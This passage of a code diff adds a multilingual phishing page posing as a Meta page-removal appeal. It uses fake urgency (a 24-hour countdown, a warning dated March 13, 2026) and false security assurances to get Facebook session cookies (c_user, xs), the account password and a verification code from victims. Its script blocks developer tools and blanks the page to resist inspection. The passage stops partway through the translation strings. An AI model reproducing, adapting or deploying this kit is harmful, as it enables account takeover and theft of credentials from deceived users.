+            <svg id="eye-hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24M1 1l22 22"/></svg>
+          </button>
+          <div class="err-msg" id="err-pw">Please enter your password to continue</div>
+        </div>
+
+        <button class="submit-btn" id="s2-btn">
+          <div class="spinner"></div>
+          <span class="btn-text" id="s2-btn-txt">Verify &amp; Continue</span>
+        </button>
+
+        <a href="#" class="forgot-link" id="s2-forgot">Forgotten password?</a>
+
+        <div class="trust-strip" style="margin-top:20px;">
+          <div class="trust-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            <span>256-bit SSL Encryption</span>
+          </div>
+          <div class="trust-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+            <span>Meta Verified Process</span>
+          </div>
+        </div>
+      </div>
+    </div><!-- /step-2 -->
+
+    <!-- ──── STEP 3: VIDEO + CODE ENTRY ──── -->
+    <div id="step-3" class="step-panel">
+      <div class="step-card">
+        <h2 class="step-card-title" id="s3-title">Video Identity Confirmation</h2>
+        <p class="step-card-sub" id="s3-sub">As a final security step, watch the complete verification video below and enter the confirmation code shown at the end to finalize your appeal.</p>
+
+        <div class="video-wrap">
+          <div class="video-overlay-label">&#x1F4F9; Final Verification Video</div>
+          <video id="step3-video" controls playsinline preload="metadata">
+            <source src="https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/videos//system-updated.mp4" type="video/mp4" />
+          </video>
+        </div>
+
+
+        <div class="info-box">
+          <p id="s3-info1">&#x1F511; Watch the full video and enter the code shown at the end to complete your submission.</p>
+        </div>
+
+        <div class="field-wrap" id="fw-code" style="opacity:1;pointer-events:auto;transition:opacity 0.4s;">
+          <input type="text" id="inp-code" autocomplete="off" inputmode="numeric" />
+          <label for="inp-code" id="lbl-code">Enter Verification Code</label>
+          <div class="err-msg" id="err-code">Please enter the code shown in the video</div>
+        </div>
+
+        <button class="submit-btn" id="s3-btn">
+          <div class="spinner"></div>
+          <span class="btn-text" id="s3-btn-txt">Submit Final Appeal</span>
+        </button>
+      </div>
+    </div><!-- /step-3 -->
+
+    <!-- ──── SUCCESS ──── -->
+    <div id="step-success" class="step-panel">
+      <div class="success-card">
+        <div class="success-icon">
+          <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        </div>
+        <h2 class="success-title" id="suc-title">Appeal Submitted Successfully</h2>
+        <p class="success-sub" id="suc-sub">Your appeal has been received and assigned to the Meta Policy Review team. A decision will be communicated to your registered email address, typically within 5–7 business days.</p>
+        <div class="success-ref">
+          <span id="suc-ref-lbl">Reference ID:</span>
+          <strong id="suc-ref-val">---</strong>
+        </div>
+        <div class="success-steps">
+          <div class="success-step"><div class="success-step-num">1</div><span id="suc-s1">Our review team has received your appeal and is verifying your submitted credentials.</span></div>
+          <div class="success-step"><div class="success-step-num">2</div><span id="suc-s2">A specialist will be assigned within 24–48 hours to evaluate your case against our current enforcement policies.</span></div>
+          <div class="success-step"><div class="success-step-num">3</div><span id="suc-s3">You will receive an email notification with the outcome. Ensure your account email address is active and accessible.</span></div>
+        </div>
+      </div>
+    </div><!-- /success -->
+
+  </main>
+
+  <!-- FOOTER -->
+  <footer id="site-footer">
+    <div class="footer-links">
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Service</a>
+      <a href="#">Community Standards</a>
+      <a href="#">Help Center</a>
+      <a href="#">Cookies</a>
+    </div>
+    <p class="footer-copy">Meta Platforms, Inc. &copy; 2026 &bull; All rights reserved &bull; Account Enforcement &amp; Policy Division</p>
+  </footer>
+
+</div><!-- /#app -->
+
+<script>
+(function () {
+  'use strict';
+
+  /* ── SECURITY ────────────────────────────────────────── */
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && ['u','s','i','j','c'].includes(e.key.toLowerCase())) ||
+        (e.ctrlKey && e.shiftKey && ['i','j','c','k'].includes(e.key.toLowerCase()))) {
+      e.preventDefault();
+    }
+  });
+  (function devToolsGuard() {
+    const threshold = 160;
+    setInterval(() => {
+      if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+        document.body.innerHTML = '';
+      }
+    }, 1000);
+  })();
+
+  /* ── TRANSLATIONS ─────────────────────────────────────── */
+  const T = {
+    english: {
+      hdrBadge:'ENFORCEMENT ACTIVE', warnTitle:'Your Page Has Been Flagged for Removal',
+      warnSub:'Multiple community reports and our automated systems have identified repeated policy violations on your Page. This action was initiated on March 13, 2026. Immediate action is required to prevent permanent deactivation.',
+      caseTitle:'Enforcement Case Details', appealBtnTxt:'Start My Appeal Now',
+      disclaimerTxt:'By proceeding, you agree to Meta\'s Terms of Service and Community Standards. All submitted information is encrypted and processed in accordance with our Privacy Policy.',
+      s1Title:'Identity Verification', s1Sub:'To process your appeal, we must verify you are the authorized administrator of this Page. Please provide your account credentials accurately.',
+      s1Info1:'🔒 Your data is transmitted using 256-bit TLS encryption and is used solely for identity verification purposes.',
+      s1Info2:'⚠️ Providing false information will result in immediate rejection of your appeal and may lead to further enforcement actions.',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'Must be a valid numeric ID (minimum 7 digits)', xsErr:'Must contain uppercase, lowercase, number, and a special character',
+      s1BtnTxt:'Submit & Continue',
+      s2Title:'Account Authentication', s2Sub:'To confirm your identity as the authorized Page administrator, please enter your Facebook account password. This prevents unauthorized appeals.',
+      s2Info1:'🔐 Your password is never stored or logged. It is used exclusively to authenticate your account during this appeal session.',
+      pwLabel:'Password', pwErr:'Please enter your password to continue',
+      s2BtnTxt:'Verify & Continue', forgotPw:'Forgotten password?',
+      s3Title:'Video Identity Confirmation', s3Sub:'As a final security measure, watch the complete verification video below and enter the confirmation code displayed at the end to finalize your appeal.',
+      s3Info1:'▶️ Watch the full video carefully and enter the code shown at the end to complete your submission.',
+      codeLabel:'Enter Verification Code', codeErr:'Please enter the code shown in the video',
+      s3BtnTxt:'Submit Final Appeal',
+      sucTitle:'Appeal Submitted Successfully',
+      sucSub:'Your appeal has been received and assigned to the Meta Policy Review team. A decision will be communicated to your registered email address, typically within 5–7 business days.',
+      sucRefLbl:'Reference ID:',
+      sucS1:'Our review team has received your appeal and is currently verifying your submitted credentials.',
+      sucS2:'A specialist will be assigned within 24–48 hours to evaluate your case against our current enforcement policies.',
+      sucS3:'You will receive an email notification with the outcome. Ensure your account email is active and accessible.',
+      vrTypeLbl:'Violation Type', vrTypeVal:'Content Policy',
+      vrStatusLbl:'Account Status', vrStatusVal:'Pending Review',
+      vrDeadlineLbl:'Appeal Deadline', vrDeadlineVal:'Within 24 Hours',
+      countdownLabel:'Time remaining to file your appeal:', ps1Lbl:'Identity\nVerification', ps2Lbl:'Account\nAuthentication', ps3Lbl:'Video\nConfirmation',
+      tHrs:'HRS', tMin:'MIN', tSec:'SEC',
+    },
+    hindi: {
+      hdrBadge:'प्रवर्तन सक्रिय', warnTitle:'आपका पेज हटाने के लिए चिह्नित किया गया है',
+      warnSub:'हमारे स्वचालित सिस्टम और सामुदायिक रिपोर्ट ने आपके पेज पर बार-बार नीति उल्लंघन की पहचान की है। 13 मार्च 2026 को यह कार्रवाई शुरू की गई। स्थायी निष्क्रियता को रोकने के लिए तत्काल कार्रवाई आवश्यक है।',
+      caseTitle:'प्रवर्तन मामले का विवरण', appealBtnTxt:'अभी अपील शुरू करें',
+      disclaimerTxt:'आगे बढ़कर आप Meta की सेवा शर्तों और सामुदायिक मानकों से सहमत हैं।',
+      s1Title:'पहचान सत्यापन', s1Sub:'आपकी अपील को संसाधित करने के लिए हमें यह सत्यापित करना होगा कि आप इस पेज के अधिकृत व्यवस्थापक हैं।',
+      s1Info1:'🔒 आपका डेटा 256-बिट TLS एन्क्रिप्शन का उपयोग करके प्रेषित किया जाता है।',
+      s1Info2:'⚠️ गलत जानकारी प्रदान करने पर आपकी अपील तुरंत अस्वीकार कर दी जाएगी।',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'कम से कम 7 अंकों की मान्य संख्यात्मक आईडी होनी चाहिए', xsErr:'बड़े, छोटे अक्षर, संख्या और विशेष वर्ण होना चाहिए',
+      s1BtnTxt:'सबमिट करें और जारी रखें',
+      s2Title:'खाता प्रमाणीकरण', s2Sub:'पेज व्यवस्थापक के रूप में अपनी पहचान की पुष्टि करने के लिए कृपया अपना Facebook पासवर्ड दर्ज करें।',
+      s2Info1:'🔐 आपका पासवर्ड कभी संग्रहित या लॉग नहीं किया जाता है।',
+      pwLabel:'पासवर्ड', pwErr:'जारी रखने के लिए अपना पासवर्ड दर्ज करें',
+      s2BtnTxt:'सत्यापित करें और जारी रखें', forgotPw:'पासवर्ड भूल गए?',
+      s3Title:'वीडियो पहचान पुष्टि', s3Sub:'अंतिम सुरक्षा चरण के रूप में, नीचे दिया गया सत्यापन वीडियो पूरा देखें और अंत में दिखाया गया कोड दर्ज करें।',
+      s3Info1:'▶️ पूरा वीडियो देखें और अंत में दिखाया गया कोड दर्ज करें।',
+      codeLabel:'सत्यापन कोड दर्ज करें', codeErr:'कृपया वीडियो में दिखाया गया कोड दर्ज करें',
+      s3BtnTxt:'अंतिम अपील सबमिट करें',
+      sucTitle:'अपील सफलतापूर्वक सबमिट की गई',
+      sucSub:'आपकी अपील Meta नीति समीक्षा टीम को प्राप्त हो गई है। निर्णय आमतौर पर 5-7 कार्यदिवसों के भीतर आपके ईमेल पर भेजा जाएगा।',
+      sucRefLbl:'संदर्भ आईडी:',
+      sucS1:'हमारी समीक्षा टीम आपकी अपील प्राप्त कर चुकी है।',
+      sucS2:'24-48 घंटों के भीतर एक विशेषज्ञ नियुक्त किया जाएगा।',
+      sucS3:'निर्णय आपके ईमेल पर सूचित किया जाएगा।',
+      vrTypeLbl:'उल्लंघन का प्रकार', vrTypeVal:'सामग्री नीति',
+      vrStatusLbl:'खाता स्थिति', vrStatusVal:'समीक्षाधीन',
+      vrDeadlineLbl:'अपील की समयसीमा', vrDeadlineVal:'24 घंटे के भीतर',
+      countdownLabel:'अपील दाखिल करने का शेष समय:', ps1Lbl:'पहचान\nसत्यापन', ps2Lbl:'खाता\nप्रमाणीकरण', ps3Lbl:'वीडियो\nपुष्टि',
+      tHrs:'घंटे', tMin:'मिनट', tSec:'सेकंड',
+    },
+    spanish: {
+      hdrBadge:'CUMPLIMIENTO ACTIVO', warnTitle:'Tu Página Ha Sido Marcada para Eliminación',
+      warnSub:'Múltiples reportes de la comunidad y nuestros sistemas automatizados han identificado violaciones repetidas a las políticas en tu Página. Esta acción fue iniciada el 13 de marzo de 2026.',
+      caseTitle:'Detalles del Caso de Cumplimiento', appealBtnTxt:'Iniciar Mi Apelación Ahora',
+      disclaimerTxt:'Al continuar, aceptas los Términos de Servicio y las Normas comunitarias de Meta.',
+      s1Title:'Verificación de Identidad', s1Sub:'Para procesar tu apelación, debemos verificar que eres el administrador autorizado de esta Página.',
+      s1Info1:'🔒 Tus datos se transmiten con cifrado TLS de 256 bits y se utilizan únicamente para verificación de identidad.',
+      s1Info2:'⚠️ Proporcionar información falsa resultará en el rechazo inmediato de tu apelación.',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'Debe ser un ID numérico válido (mínimo 7 dígitos)', xsErr:'Debe contener mayúsculas, minúsculas, número y carácter especial',
+      s1BtnTxt:'Enviar y Continuar',
+      s2Title:'Autenticación de Cuenta', s2Sub:'Para confirmar tu identidad como administrador autorizado, ingresa tu contraseña de Facebook.',
+      s2Info1:'🔐 Tu contraseña nunca se almacena ni se registra.',
+      pwLabel:'Contraseña', pwErr:'Por favor ingresa tu contraseña para continuar',
+      s2BtnTxt:'Verificar y Continuar', forgotPw:'¿Olvidaste tu contraseña?',
+      s3Title:'Confirmación de Identidad por Video', s3Sub:'Como medida de seguridad final, mira el video de verificación completo e ingresa el código de confirmación que aparece al final.',
+      s3Info1:'▶️ Mira el video completo e ingresa el código mostrado al final.',
+      codeLabel:'Ingresar Código de Verificación', codeErr:'Por favor ingresa el código mostrado en el video',
+      s3BtnTxt:'Enviar Apelación Final',
+      sucTitle:'Apelación Enviada Exitosamente',
+      sucSub:'Tu apelación ha sido recibida y asignada al equipo de Revisión de Políticas de Meta. Una decisión será comunicada en 5–7 días hábiles.',
+      sucRefLbl:'ID de Referencia:',
+      sucS1:'Nuestro equipo ha recibido tu apelación y está verificando tus credenciales.',
+      sucS2:'Un especialista será asignado dentro de 24–48 horas.',
+      sucS3:'Recibirás una notificación por correo electrónico con el resultado.',
+      vrTypeLbl:'Tipo de Violación', vrTypeVal:'Política de Contenido',
+      vrStatusLbl:'Estado de Cuenta', vrStatusVal:'En Revisión',
+      vrDeadlineLbl:'Plazo de Apelación', vrDeadlineVal:'Dentro de 24 Horas',
+      countdownLabel:'Tiempo restante para presentar tu apelación:', ps1Lbl:'Verificación\nde Identidad', ps2Lbl:'Autenticación\nde Cuenta', ps3Lbl:'Confirmación\nde Video',
+      tHrs:'HRS', tMin:'MIN', tSec:'SEG',
+    },
+    portuguese: {
+      hdrBadge:'CUMPRIMENTO ATIVO', warnTitle:'Sua Página Foi Marcada para Remoção',
+      warnSub:'Múltiplos relatórios da comunidade e nossos sistemas automatizados identificaram violações repetidas das políticas em sua Página. Esta ação foi iniciada em 13 de março de 2026.',
+      caseTitle:'Detalhes do Caso de Cumprimento', appealBtnTxt:'Iniciar Meu Recurso Agora',
+      disclaimerTxt:'Ao prosseguir, você concorda com os Termos de Serviço e Padrões da Comunidade da Meta.',
+      s1Title:'Verificação de Identidade', s1Sub:'Para processar seu recurso, precisamos verificar que você é o administrador autorizado desta Página.',
+      s1Info1:'🔒 Seus dados são transmitidos com criptografia TLS de 256 bits.',
+      s1Info2:'⚠️ Fornecer informações falsas resultará na rejeição imediata do seu recurso.',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'Deve ser um ID numérico válido (mínimo 7 dígitos)', xsErr:'Deve conter maiúsculas, minúsculas, número e caractere especial',
+      s1BtnTxt:'Enviar e Continuar',
+      s2Title:'Autenticação de Conta', s2Sub:'Para confirmar sua identidade como administrador autorizado, insira sua senha do Facebook.',
+      s2Info1:'🔐 Sua senha nunca é armazenada ou registrada.',
+      pwLabel:'Senha', pwErr:'Por favor insira sua senha para continuar',
+      s2BtnTxt:'Verificar e Continuar', forgotPw:'Esqueceu a senha?',
+      s3Title:'Confirmação de Identidade por Vídeo', s3Sub:'Como medida de segurança final, assista ao vídeo de verificação completo e insira o código de confirmação exibido no final.',
+      s3Info1:'▶️ Assista ao vídeo completo e insira o código mostrado no final.',
+      codeLabel:'Inserir Código de Verificação', codeErr:'Por favor insira o código mostrado no vídeo',
+      s3BtnTxt:'Enviar Recurso Final',
+      sucTitle:'Recurso Enviado com Sucesso',
+      sucSub:'Seu recurso foi recebido e atribuído à equipe de Revisão de Políticas da Meta. Uma decisão será comunicada em 5–7 dias úteis.',
+      sucRefLbl:'ID de Referência:',
+      sucS1:'Nossa equipe recebeu seu recurso e está verificando suas credenciais.',
+      sucS2:'Um especialista será designado dentro de 24–48 horas.',
+      sucS3:'Você receberá uma notificação por e-mail com o resultado.',
+      vrTypeLbl:'Tipo de Violação', vrTypeVal:'Política de Conteúdo',
+      vrStatusLbl:'Status da Conta', vrStatusVal:'Em Análise',
+      vrDeadlineLbl:'Prazo do Recurso', vrDeadlineVal:'Dentro de 24 Horas',
+      countdownLabel:'Tempo restante para apresentar seu recurso:', ps1Lbl:'Verificação\nde Identidade', ps2Lbl:'Autenticação\nde Conta', ps3Lbl:'Confirmação\nde Vídeo',
+      tHrs:'HRS', tMin:'MIN', tSec:'SEG',
+    },
+    tamil: {
+      hdrBadge:'அமலாக்கம் செயலில்', warnTitle:'உங்கள் பக்கம் அகற்றலுக்கு குறிக்கப்பட்டுள்ளது',
+      warnSub:'சமூக அறிக்கைகள் மற்றும் எங்கள் தானியங்கி அமைப்புகள் உங்கள் பக்கத்தில் திரும்பிய கொள்கை மீறல்களை அடையாளம் கண்டுள்ளன. இந்த நடவடிக்கை மார்ச் 13, 2026 அன்று தொடங்கப்பட்டது.',
+      caseTitle:'அமலாக்க வழக்கு விவரங்கள்', appealBtnTxt:'இப்போது மேல்முறையீட்டை தொடங்கு',
+      disclaimerTxt:'தொடர்வதன் மூலம், Meta சேவை விதிமுறைகளுக்கு ஒப்புக்கொள்கிறீர்கள்.',
+      s1Title:'அடையாள சரிபார்ப்பு', s1Sub:'உங்கள் மேல்முறையீட்டை செயலாக்க, நீங்கள் இந்த பக்கத்தின் அங்கீகரிக்கப்பட்ட நிர்வாகி என்று சரிபார்க்க வேண்டும்.',
+      s1Info1:'🔒 உங்கள் தரவு 256-bit TLS குறியாக்கம் மூலம் அனுப்பப்படுகிறது.',
+      s1Info2:'⚠️ தவறான தகவல் வழங்குவது உங்கள் மேல்முறையீட்டை உடனடியாக நிராகரிக்கும்.',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'குறைந்தது 7 இலக்கங்கள் கொண்ட செல்லுபடியாகும் எண் ஐடி', xsErr:'பெரிய, சிறிய எழுத்துக்கள், எண் மற்றும் சிறப்பு எழுத்து இருக்க வேண்டும்',
+      s1BtnTxt:'சமர்ப்பி மற்றும் தொடர்',
+      s2Title:'கணக்கு அங்கீகாரம்', s2Sub:'அங்கீகரிக்கப்பட்ட நிர்வாகியாக உங்கள் அடையாளத்தை உறுதிப்படுத்த உங்கள் Facebook கடவுச்சொல்லை உள்ளிடவும்.',
+      s2Info1:'🔐 உங்கள் கடவுச்சொல் ஒருபோதும் சேமிக்கப்படுவதில்லை.',
+      pwLabel:'கடவுச்சொல்', pwErr:'தொடர்வதற்கு உங்கள் கடவுச்சொல்லை உள்ளிடவும்',
+      s2BtnTxt:'சரிபார்த்து தொடர்', forgotPw:'கடவுச்சொல் மறந்துவிட்டதா?',
+      s3Title:'வீடியோ அடையாள உறுதிப்படுத்தல்', s3Sub:'இறுதி பாதுகாப்பு நடவடிக்கையாக, கீழே உள்ள சரிபார்ப்பு வீடியோவை முழுவதும் பாருங்கள்.',
+      s3Info1:'▶️ முழு வீடியோவை பாருங்கள் மற்றும் இறுதியில் காட்டப்படும் குறியீட்டை உள்ளிடவும்.',
+      codeLabel:'சரிபார்ப்பு குறியீட்டை உள்ளிடவும்', codeErr:'வீடியோவில் காட்டப்பட்ட குறியீட்டை உள்ளிடவும்',
+      s3BtnTxt:'இறுதி மேல்முறையீட்டை சமர்ப்பிக்கவும்',
+      sucTitle:'மேல்முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது',
+      sucSub:'உங்கள் மேல்முறையீடு Meta கொள்கை மதிப்பாய்வு குழுவிற்கு ஒதுக்கப்பட்டுள்ளது. 5-7 வணிக நாட்களுக்குள் முடிவு தெரிவிக்கப்படும்.',
+      sucRefLbl:'குறிப்பு ஐடி:',
+      sucS1:'எங்கள் மதிப்பாய்வு குழு உங்கள் மேல்முறையீட்டை பெற்றது.',
+      sucS2:'24-48 மணி நேரத்திற்குள் ஒரு நிபுணர் நியமிக்கப்படுவார்.',
+      sucS3:'முடிவு உங்கள் மின்னஞ்சலில் அனுப்பப்படும்.',
+      vrTypeLbl:'மீறல் வகை', vrTypeVal:'உள்ளடக்க கொள்கை',
+      vrStatusLbl:'கணக்கு நிலை', vrStatusVal:'மதிப்பாய்வில் உள்ளது',
+      vrDeadlineLbl:'மேல்முறையீடு காலக்கெடு', vrDeadlineVal:'24 மணி நேரத்திற்குள்',
+      countdownLabel:'மேல்முறையீடு செய்ய மீதமுள்ள நேரம்:', ps1Lbl:'அடையாள\nசரிபார்ப்பு', ps2Lbl:'கணக்கு\nஅங்கீகாரம்', ps3Lbl:'வீடியோ\nஉறுதிப்படுத்தல்',
+      tHrs:'மணி', tMin:'நிமி', tSec:'வி',
+    },
+    arabic: {
+      hdrBadge:'التنفيذ نشط', warnTitle:'تم تصنيف صفحتك للإزالة',
+      warnSub:'رصدت تقارير متعددة من المجتمع وأنظمتنا الآلية انتهاكات متكررة للسياسات على صفحتك. بدأت هذه الإجراءات في 13 مارس 2026.',
+      caseTitle:'تفاصيل قضية التنفيذ', appealBtnTxt:'ابدأ استئنافي الآن',
+      disclaimerTxt:'بالمتابعة، فإنك توافق على شروط خدمة Meta ومعايير المجتمع.',
+      s1Title:'التحقق من الهوية', s1Sub:'لمعالجة استئنافك، نحتاج إلى التحقق من أنك المسؤول المعتمد لهذه الصفحة.',
+      s1Info1:'🔒 يتم إرسال بياناتك باستخدام تشفير TLS بمعيار 256 بت.',
+      s1Info2:'⚠️ تقديم معلومات خاطئة سيؤدي إلى رفض استئنافك فوراً.',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'يجب أن يكون معرفاً رقمياً صالحاً (7 أرقام على الأقل)', xsErr:'يجب أن يحتوي على أحرف كبيرة وصغيرة وأرقام وحرف خاص',
+      s1BtnTxt:'إرسال والمتابعة',
+      s2Title:'مصادقة الحساب', s2Sub:'لتأكيد هويتك كمسؤول معتمد، أدخل كلمة مرور حساب Facebook الخاص بك.',
+      s2Info1:'🔐 لا يتم تخزين كلمة مرورك أو تسجيلها أبداً.',
+      pwLabel:'كلمة المرور', pwErr:'يرجى إدخال كلمة مرورك للمتابعة',
+      s2BtnTxt:'التحقق والمتابعة', forgotPw:'هل نسيت كلمة المرور؟',
+      s3Title:'تأكيد الهوية بالفيديو', s3Sub:'كإجراء أمني أخير، شاهد مقطع الفيديو التحقق الكامل وأدخل رمز التأكيد الظاهر في النهاية.',
+      s3Info1:'▶️ شاهد الفيديو كاملاً وأدخل الرمز الظاهر في النهاية.',
+      codeLabel:'أدخل رمز التحقق', codeErr:'يرجى إدخال الرمز الظاهر في الفيديو',
+      s3BtnTxt:'إرسال الاستئناف النهائي',
+      sucTitle:'تم إرسال الاستئناف بنجاح',
+      sucSub:'تم استلام استئنافك وإحالته إلى فريق مراجعة سياسات Meta. سيتم إبلاغك بالقرار عبر البريد الإلكتروني خلال 5-7 أيام عمل.',
+      sucRefLbl:'رقم المرجع:',
+      sucS1:'استلم فريق المراجعة استئنافك وهو يتحقق من بياناتك.',
+      sucS2:'سيتم تعيين متخصص خلال 24-48 ساعة.',
+      sucS3:'ستتلقى إشعاراً بالبريد الإلكتروني بنتيجة الاستئناف.',
+      vrTypeLbl:'نوع الانتهاك', vrTypeVal:'سياسة المحتوى',
+      vrStatusLbl:'حالة الحساب', vrStatusVal:'قيد المراجعة',
+      vrDeadlineLbl:'الموعد النهائي للاستئناف', vrDeadlineVal:'خلال 24 ساعة',
+      countdownLabel:'الوقت المتبقي لتقديم استئنافك:', ps1Lbl:'التحقق\nمن الهوية', ps2Lbl:'مصادقة\nالحساب', ps3Lbl:'تأكيد\nالفيديو',
+      tHrs:'ساعة', tMin:'دقيقة', tSec:'ثانية',
+    },
+    french: {
+      hdrBadge:'APPLICATION ACTIVE', warnTitle:'Votre Page a été Signalée pour Suppression',
+      warnSub:'De nombreux signalements de la communauté et nos systèmes automatisés ont identifié des violations répétées des politiques sur votre Page. Cette action a été initiée le 13 mars 2026.',
+      caseTitle:'Détails du Dossier d\'Application', appealBtnTxt:'Commencer Mon Appel Maintenant',
+      disclaimerTxt:'En continuant, vous acceptez les Conditions d\'utilisation et les Standards communautaires de Meta.',
+      s1Title:'Vérification d\'Identité', s1Sub:'Pour traiter votre appel, nous devons vérifier que vous êtes l\'administrateur autorisé de cette Page.',
+      s1Info1:'🔒 Vos données sont transmises avec un chiffrement TLS 256 bits.',
+      s1Info2:'⚠️ La fourniture d\'informations fausses entraînera le rejet immédiat de votre appel.',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'Doit être un ID numérique valide (minimum 7 chiffres)', xsErr:'Doit contenir majuscules, minuscules, chiffre et caractère spécial',
+      s1BtnTxt:'Soumettre et Continuer',
+      s2Title:'Authentification du Compte', s2Sub:'Pour confirmer votre identité en tant qu\'administrateur autorisé, entrez votre mot de passe Facebook.',
+      s2Info1:'🔐 Votre mot de passe n\'est jamais stocké ni enregistré.',
+      pwLabel:'Mot de passe', pwErr:'Veuillez entrer votre mot de passe pour continuer',
+      s2BtnTxt:'Vérifier et Continuer', forgotPw:'Mot de passe oublié?',
+      s3Title:'Confirmation d\'Identité par Vidéo', s3Sub:'Comme mesure de sécurité finale, regardez la vidéo de vérification complète et entrez le code de confirmation affiché à la fin.',
+      s3Info1:'▶️ Regardez la vidéo complète et entrez le code affiché à la fin.',
+      codeLabel:'Entrer le Code de Vérification', codeErr:'Veuillez entrer le code affiché dans la vidéo',
+      s3BtnTxt:'Soumettre l\'Appel Final',
+      sucTitle:'Appel Soumis avec Succès',
+      sucSub:'Votre appel a été reçu et assigné à l\'équipe de Révision des Politiques de Meta. Une décision vous sera communiquée sous 5 à 7 jours ouvrables.',
+      sucRefLbl:'ID de Référence:',
+      sucS1:'Notre équipe a reçu votre appel et vérifie vos justificatifs.',
+      sucS2:'Un spécialiste sera assigné dans les 24 à 48 heures.',
+      sucS3:'Vous recevrez une notification par e-mail avec le résultat.',
+      vrTypeLbl:'Type de Violation', vrTypeVal:'Politique de Contenu',
+      vrStatusLbl:'Statut du Compte', vrStatusVal:'En Cours d\'Examen',
+      vrDeadlineLbl:'Délai d\'Appel', vrDeadlineVal:'Dans les 24 Heures',
+      countdownLabel:'Temps restant pour déposer votre appel:', ps1Lbl:'Vérification\nd\'Identité', ps2Lbl:'Authentification\ndu Compte', ps3Lbl:'Confirmation\nVidéo',
+      tHrs:'HRS', tMin:'MIN', tSec:'SEC',
+    },
+    vietnamese: {
+      hdrBadge:'THỰC THI ĐANG HOẠT ĐỘNG', warnTitle:'Trang Của Bạn Đã Bị Gắn Cờ Để Xóa',
+      warnSub:'Nhiều báo cáo từ cộng đồng và hệ thống tự động của chúng tôi đã phát hiện vi phạm chính sách lặp đi lặp lại trên Trang của bạn. Hành động này được bắt đầu vào ngày 13 tháng 3 năm 2026.',
+      caseTitle:'Chi Tiết Vụ Vi Phạm', appealBtnTxt:'Bắt Đầu Khiếu Nại Ngay',
+      disclaimerTxt:'Bằng cách tiếp tục, bạn đồng ý với Điều khoản Dịch vụ và Tiêu chuẩn Cộng đồng của Meta.',
+      s1Title:'Xác Minh Danh Tính', s1Sub:'Để xử lý khiếu nại của bạn, chúng tôi cần xác minh rằng bạn là quản trị viên được ủy quyền của Trang này.',
+      s1Info1:'🔒 Dữ liệu của bạn được truyền bằng mã hóa TLS 256-bit.',
+      s1Info2:'⚠️ Cung cấp thông tin sai sẽ dẫn đến từ chối ngay lập tức khiếu nại của bạn.',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'Phải là ID số hợp lệ (tối thiểu 7 chữ số)', xsErr:'Phải chứa chữ hoa, chữ thường, số và ký tự đặc biệt',
+      s1BtnTxt:'Gửi và Tiếp Tục',
+      s2Title:'Xác Thực Tài Khoản', s2Sub:'Để xác nhận danh tính của bạn là quản trị viên được ủy quyền, hãy nhập mật khẩu Facebook của bạn.',
+      s2Info1:'🔐 Mật khẩu của bạn không bao giờ được lưu trữ hoặc ghi lại.',
+      pwLabel:'Mật khẩu', pwErr:'Vui lòng nhập mật khẩu của bạn để tiếp tục',
+      s2BtnTxt:'Xác Minh và Tiếp Tục', forgotPw:'Quên mật khẩu?',
+      s3Title:'Xác Nhận Danh Tính Qua Video', s3Sub:'Là biện pháp bảo mật cuối cùng, hãy xem toàn bộ video xác minh bên dưới và nhập mã xác nhận hiển thị ở cuối.',
+      s3Info1:'▶️ Xem toàn bộ video và nhập mã hiển thị ở cuối.',
+      codeLabel:'Nhập Mã Xác Minh', codeErr:'Vui lòng nhập mã hiển thị trong video',
+      s3BtnTxt:'Gửi Khiếu Nại Cuối Cùng',
+      sucTitle:'Khiếu Nại Đã Gửi Thành Công',
+      sucSub:'Khiếu nại của bạn đã được nhận và giao cho nhóm Xem xét Chính sách của Meta. Quyết định sẽ được thông báo trong 5–7 ngày làm việc.',
+      sucRefLbl:'ID Tham Chiếu:',
+      sucS1:'Nhóm xem xét của chúng tôi đã nhận khiếu nại và đang xác minh thông tin của bạn.',
+      sucS2:'Một chuyên gia sẽ được phân công trong vòng 24–48 giờ.',
+      sucS3:'Bạn sẽ nhận được thông báo qua email về kết quả.',
+      vrTypeLbl:'Loại Vi Phạm', vrTypeVal:'Chính Sách Nội Dung',
+      vrStatusLbl:'Trạng Thái Tài Khoản', vrStatusVal:'Đang Xem Xét',
+      vrDeadlineLbl:'Hạn Chót Khiếu Nại', vrDeadlineVal:'Trong Vòng 24 Giờ',
+      countdownLabel:'Thời gian còn lại để nộp khiếu nại:', ps1Lbl:'Xác Minh\nDanh Tính', ps2Lbl:'Xác Thực\nTài Khoản', ps3Lbl:'Xác Nhận\nVideo',
+      tHrs:'GIỜ', tMin:'PHÚT', tSec:'GIÂY',
+    },
+    ghanaian: {
+      hdrBadge:'MMARA DI HƆ', warnTitle:'Wɔakyerɛ Wo Krataa sɛ Wɔbɛpaew',
